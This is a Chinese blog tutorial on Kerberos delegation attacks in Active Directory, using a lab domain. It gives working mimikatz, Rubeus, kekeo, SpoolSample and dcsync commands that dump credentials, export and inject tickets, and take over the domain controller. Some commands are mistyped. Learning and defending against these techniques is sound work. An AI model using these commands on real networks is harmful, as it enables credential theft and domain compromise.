@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>基于域委派的攻击</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/intranet-13/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='基于域委派的攻击'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/intranet-13/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-12-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-12-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="基于域委派的攻击">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/intranet-13/">
+                <img src="/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post 基于域委派的攻击" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91/" style="background-color: #2a9d8f; color: #fff;">
+                内网
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/intranet-13/">基于域委派的攻击</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 15, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="基于域委派的攻击">基于域委派的攻击</h1>
+<h2 id="定义">定义</h2>
+<h3 id="委派">委派</h3>
+<pre tabindex="0"><code>Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate
+
+This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request
+
+Many real-world scenarios exist in which a Web application “front end” must retrieve data from a more secure “back end”, such as a Web service that is connected to a Microsoft SQL Server database.
+</code></pre><p>域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。</p>
+<p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+<p>服务账号(<code>Service Account</code>)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 <code>MS SQL Server</code> 在安装时，会在域内自动注册服务账号 <code>SqlServiceAccount</code>，这类账号不能用于交互式登录。</p>
+<h3 id="多跳认证和委派的流程">多跳认证和委派的流程</h3>
+<p><strong>多跳认证示意图：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 181; 
+			flex-basis: 435px"
+	>
+	<a href="/p/intranet-13/image-20220312232633308.png" data-size="970x535">
+		<img src="/p/intranet-13/image-20220312232633308.png"
+			width="970"
+			height="535"
+			srcset="/p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>流程：</strong></p>
+<ul>
+<li>域内用户 jack 以 Kerberos 方式认证后(先向 DS 进行常规的 kerberos 认证，获取 Web 服务器的访问权限)访问 Web 服务器</li>
+<li>Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请</li>
+<li>KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT</li>
+<li>websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 TGS</li>
+<li>KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 TGS</li>
+<li>websvc 收到的 jack 用户的授权票据 TGS 后，可访问文件服务，完成多跳认证。</li>
+</ul>
+<h3 id="委派分类">委派分类</h3>
+<ul>
+<li>非约束委派(Unconstrained Delegation)</li>
+</ul>
+<p>服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务。</p>
+<ul>
+<li>约束性委派(Constrained Delegation)</li>
+</ul>
+<p>Kerberos 的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的 <code>TGS</code>，从而只能模拟用户访问特定的服务。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 85; 
+			flex-basis: 205px"
+	>
+	<a href="/p/intranet-13/image-20220312234816265.png" data-size="767x897">
+		<img src="/p/intranet-13/image-20220312234816265.png"
+			width="767"
+			height="897"
+			srcset="/p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="非约束委派">非约束委派</h2>
+<h3 id="原理">原理</h3>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 129; 
+			flex-basis: 311px"
+	>
+	<a href="/p/intranet-13/image-20220313152035356.png" data-size="800x616">
+		<img src="/p/intranet-13/image-20220313152035356.png"
+			width="800"
+			height="616"
+			srcset="/p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>当 <code>user</code> 访问 <code>service1</code> 时，如果 <code>service1</code> 的服务账号开启了 <code>unconstrained delegation</code>（非约束委派），则当 <code>user</code> 访问 <code>service1</code> 时会将 <code>user</code> 的 <code>TGT</code> 发送给 <code>service1</code> 并保存在内存中以备下次重用，然后 <code>service1</code> 就可以利用这张<code>TGT</code> 以 <code>user</code>的身份去访问域内的任何服务（任何服务是指<code>user</code>能访问的服务）。</p>
+<p><strong>流程如下：</strong></p>
+<ul>
+<li>用户向KDC请求可转发TGT，记为TGT1</li>
+<li>KDC返回TGT1</li>
+<li>用户通过TGT1向KDC请求转发TGT2</li>
+<li>KDC返回TGT2</li>
+<li>用户通过TGT1向KDC申请访问服务1的TGS</li>
+<li>KDC返回TGS</li>
+<li><strong>用户发送TGS、TGT1、TGT2和TGT2的SessionKey给服务1</strong></li>
+<li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的TGS（服务访问票据）</li>
+<li>KDC给服务1返回服务2的TGS</li>
+<li>服务1以用户名义向服务2发出请求</li>
+<li>服务2响应服务1的请求</li>
+<li>服务1响应用户第7步骤的请求</li>
+</ul>
+<blockquote>
+<p>其中<code>TGT2</code>是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</p>
+<p><strong>本质：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。</strong></p>
+</blockquote>
+<p><strong>查找委派账号，开启委派后，在该用户的 <code>userAccountControl</code> 属性中会包含<code>TRUSTED_FOR_DELEGATION</code>：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 533; 
+			flex-basis: 1280px"
+	>
+	<a href="/p/intranet-13/image-20220313145503582.png" data-size="1110x208">
+		<img src="/p/intranet-13/image-20220313145503582.png"
+			width="1110"
+			height="208"
+			srcset="/p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="实战">实战</h3>
+<h4 id="非约束委派查找">非约束委派查找</h4>
+<ul>
+<li><strong>adfind</strong></li>
+</ul>
+<p>基于LDAP服务。</p>
+<p><strong>查询非约束委派的主机</strong>：</p>
+<pre tabindex="0"><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 237; 
+			flex-basis: 568px"
+	>
+	<a href="/p/intranet-13/image-20220313153811163.png" data-size="1114x470">
+		<img src="/p/intranet-13/image-20220313153811163.png"
+			width="1114"
+			height="470"
+			srcset="/p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>查询非约束委派的用户</strong>：</p>
+<pre tabindex="0"><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre><ul>
+<li><strong>powerview</strong></li>
+</ul>
+<p><strong>查询配置非约束委派的用户</strong>：</p>
+<pre tabindex="0"><code>Get-NetUser -Unconstrained -Domain pentest.com
+</code></pre><p><strong>查询配置非约束委派的主机</strong>：</p>
+<pre tabindex="0"><code>Get-domaincomputer -Unconstrained -Domain pentest.com
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 152; 
+			flex-basis: 366px"
+	>
+	<a href="/p/intranet-13/image-20220313154620096.png" data-size="1112x729">
+		<img src="/p/intranet-13/image-20220313154620096.png"
+			width="1112"
+			height="729"
+			srcset="/p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>PowerShell脚本枚举域内所有的服务账号，查看哪些账号被设置委派，以及何种类型的委派：</strong></p>
+<pre tabindex="0"><code>Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | f1
+</code></pre><p>当一个用户具备对某个服务账号的SeEnableDelegationPrivilege权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用SeEnableDelegationPrivilege属性，制作极其隐蔽的后门。</p>
+<h4 id="利用-管理员模拟访问">利用-管理员模拟访问</h4>
+<p>当域管理员访问目标服务账号，且该服务账号配置了非约束性委派，那么域管理员会将自己的TGT发送给该服务，并保留在机器内存中，因此攻击者可提取这台机器上缓存的TGT，从而获得域管权限，随后进行PTT攻击即可。</p>
+<ul>
+<li>模拟管理员调用非约束性委派机的 smb 服务：<code>net use \\win7\c$</code></li>
+<li>在非约束性委派机上查看票据</li>
+</ul>
+<pre tabindex="0"><code>privilege::debug
+sekualsa::tickets
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 134; 
+			flex-basis: 321px"
+	>
+	<a href="/p/intranet-13/image-20220313162551262.png" data-size="1030x768">
+		<img src="/p/intranet-13/image-20220313162551262.png"
+			width="1030"
+			height="768"
+			srcset="/p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>导出票据</li>
+</ul>
+<pre tabindex="0"><code>sekurlas::tickets /export
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 183; 
+			flex-basis: 440px"
+	>
+	<a href="/p/intranet-13/image-20220313163303229.png" data-size="646x352">
+		<img src="/p/intranet-13/image-20220313163303229.png"
+			width="646"
+			height="352"
+			srcset="/p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>当前状况下访问域控会被拒绝</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 840; 
+			flex-basis: 2018px"
+	>
+	<a href="/p/intranet-13/image-20220313163355791.png" data-size="513x61">
+		<img src="/p/intranet-13/image-20220313163355791.png"
+			width="513"
+			height="61"
+			srcset="/p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>mimikatz 将票据注入内存</li>
+</ul>
+<pre tabindex="0"><code>kerberos::ptt 票据文件名
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 196; 
+			flex-basis: 471px"
+	>
+	<a href="/p/intranet-13/image-20220313163834084.png" data-size="962x490">
+		<img src="/p/intranet-13/image-20220313163834084.png"
+			width="962"
+			height="490"
+			srcset="/p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="利用-spooler-printer-bug">利用-Spooler Printer Bug</h4>
+<p>实际情况下，管理员不一定会访问非约束委派服务，留下TGT。可利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。</p>
+<p><strong>原理：</strong></p>
+<p>利用 Windows 打印系统远程协议 <code>(MS-RPRN)</code> 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code> 方法强制任何运行了 <code>Spooler</code> 服务的计算机以通过 <code>Kerberos</code> 或 <code>NTLM</code> 对攻击者选择的目标进行身份验证。</p>
+<blockquote>
+<p>注意：</p>
+<p><strong>这种攻击需要找到一台开启非受限委派的主机账户，而非服务账户</strong></p>
+</blockquote>
+<p><strong>POC：</strong></p>
+<p><a class="link" href="https://github.com/leechristensen/SpoolSample"  target="_blank" rel="noopener"
+    >https://github.com/leechristensen/SpoolSample</a></p>
+<ul>
+<li>用 <code>Rubeus</code> 来监听 <code>Event ID</code> 为 <code>4624</code> 事件，即监听登录会话提取TGT</li>
+</ul>
+<pre tabindex="0"><code>Rubeus.exe monitor /interval:1 /filteruser:DC$
+</code></pre><blockquote>
+<p>Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，<code>Rubeus</code>可以直接将 base64 编码的票据直接注入到内存中。</p>
+</blockquote>
+<ul>
+<li>向 DC 的 <code>Spooler</code> 服务发送请求，强制其访问 win7 进行身份验证</li>
+</ul>
+<pre tabindex="0"><code>SpoolSample.exe DC win7
+</code></pre><ul>
+<li>随后进行票据导出和注入</li>
+<li>用 <code>dcsync</code> 导出域控中所有用户的 hash，然后用 <code>krbtgt</code> 用户的 hash 生成黄金票据</li>
+</ul>
+<pre tabindex="0"><code>lsadump::dcsync /domain:test.local /all /csv
+</code></pre><h2 id="约束性委派">约束性委派</h2>
+<h3 id="原理-1">原理</h3>
+<p>由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 <code>S4U</code> (S4U2Self / S4U2proxy)。</p>
+<ul>
+<li><code>S4U2self</code> (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</li>
+<li><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</li>
+</ul>
+<p>约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 131; 
+			flex-basis: 315px"
+	>
+	<a href="/p/intranet-13/image-20220313170602409.png" data-size="1049x797">
+		<img src="/p/intranet-13/image-20220313170602409.png"
+			width="1049"
+			height="797"
+			srcset="/p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>S4U2self</strong>：</p>
+<ul>
+<li>用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</li>
+<li>通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</li>
+<li>KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</li>
+<li>service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</li>
+</ul>
+<p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p>
+<p><strong>S4U2proxy</strong>:</p>
+<ul>
+<li>用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</li>
+<li>service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</li>
+<li>如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</li>
+<li>service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</li>
+<li>service2 响应步骤 8 的请求。</li>
+<li>service1 响应用户对步骤 5 中的请求。</li>
+</ul>
+<p>当被设置为<code>约束性委派</code>时，其 <code>userAccountControl</code> 属性包含 <code>TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)</code>，且 <code>msDS-AllowedToDelegateTo</code> 属性会被设置为<strong>某些特定协议</strong>。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 416; 
+			flex-basis: 1000px"
+	>
+	<a href="/p/intranet-13/image-20220313145712428.png" data-size="1538x369">
+		<img src="/p/intranet-13/image-20220313145712428.png"
+			width="1538"
+			height="369"
+			srcset="/p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<blockquote>
+<p>注意：</p>
+<p>如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。</p>
+</blockquote>
+<h3 id="实战-1">实战</h3>
+<h4 id="约束委派查找">约束委派查找</h4>
+<ul>
+<li><strong>adfind</strong></li>
+</ul>
+<p><strong>查询约束委派的主机</strong>：</p>
+<pre tabindex="0"><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 217; 
+			flex-basis: 522px"
+	>
+	<a href="/p/intranet-13/image-20220313172008723.png" data-size="961x441">
+		<img src="/p/intranet-13/image-20220313172008723.png"
+			width="961"
+			height="441"
+			srcset="/p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>查询约束委派的用户</strong>：</p>
+<pre tabindex="0"><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+</code></pre><ul>
+<li><strong>powerview</strong></li>
+</ul>
+<p><strong>查询约束委派的主机</strong>：</p>
+<pre tabindex="0"><code>Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto
+</code></pre><p><strong>查询约束委派的用户</strong>：</p>
+<pre tabindex="0"><code>Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
+</code></pre><h4 id="利用">利用</h4>
+<p>已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者NTLM hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。</p>
+<ul>
+<li>抓取主机账户或服务账户的NTLM值 或 以其他渠道(kerberosating攻击)获取到服务账户密码</li>
+</ul>
+<pre tabindex="0"><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 244; 
+			flex-basis: 585px"
+	>
+	<a href="/p/intranet-13/image-20220313173322791.png" data-size="920x377">
+		<img src="/p/intranet-13/image-20220313173322791.png"
+			width="920"
+			height="377"
+			srcset="/p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>申请TGT(如果已经有服务账户所在主机的权限，可以直接使用mimikatz从内存中把服务账户的TGT导出，从而省略申请TGT过程)</li>
+</ul>
+<pre tabindex="0"><code>kekeo.exe 
+
+tgt::ask /user:win7$ /domain:pentest.com /ntlm:&lt;抓取到的哈希&gt;
+tgt::ask /user:win7$ /domain:pentest.com /password:123456
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 354; 
+			flex-basis: 850px"
+	>
+	<a href="/p/intranet-13/image-20220313173558350.png" data-size="1031x291">
+		<img src="/p/intranet-13/image-20220313173558350.png"
+			width="1031"
+			height="291"
+			srcset="/p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>通过 TGT，<strong>伪造S4U请求</strong>一张以 <code>Administrator</code> 用户身份访问对应服务 2（<strong>DC 的 cifs 服务</strong>）的 ST</li>
+</ul>
+<pre tabindex="0"><code>tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 211; 
+			flex-basis: 508px"
+	>
+	<a href="/p/intranet-13/image-20220313173703392.png" data-size="1029x486">
+		<img src="/p/intranet-13/image-20220313173703392.png"
+			width="1029"
+			height="486"
+			srcset="/p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><code>S4U2Self</code>获取到的 ST1 以及 <code>S4U2Proxy</code> 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 664; 
+			flex-basis: 1594px"
+	>
+	<a href="/p/intranet-13/image-20220313173749451.png" data-size="631x95">
+		<img src="/p/intranet-13/image-20220313173749451.png"
+			width="631"
+			height="95"
+			srcset="/p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>mimikatz 注入ST2到当前会话</li>
+</ul>
+<pre tabindex="0"><code>kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi
+</code></pre><h4 id="委派服务受限">委派服务受限</h4>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 264; 
+			flex-basis: 635px"
+	>
+	<a href="/p/intranet-13/image-20220313174247259.png" data-size="643x243">
+		<img src="/p/intranet-13/image-20220313174247259.png"
+			width="643"
+			height="243"
+			srcset="/p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_480x0_resize_box_3.png 480w, /p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>当允许的服务不是CIFS服务，可以在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
